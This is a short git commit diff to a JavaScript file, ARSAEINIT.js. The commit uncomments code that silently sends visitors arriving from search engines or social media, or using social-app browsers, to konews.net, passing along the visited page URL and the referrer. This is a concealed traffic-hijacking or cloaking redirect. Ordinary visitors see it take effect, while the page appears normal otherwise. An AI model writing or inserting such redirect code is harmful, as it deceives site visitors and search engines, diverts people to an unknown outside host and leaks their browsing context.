322ad36e45600ea9e3be812a7f51b6f48f36a76a
setiyawan <setiyawan87@gmail.com>
2021-12-30 13:15:49 +0700

    update to avalible

--- ARSAEINIT.js
+++ ARSAEINIT.js
@@ -1,3 +1,3 @@
-//var ars = 'https://konews.net';
+var ars = 'https://konews.net';
 
-//if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
+if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
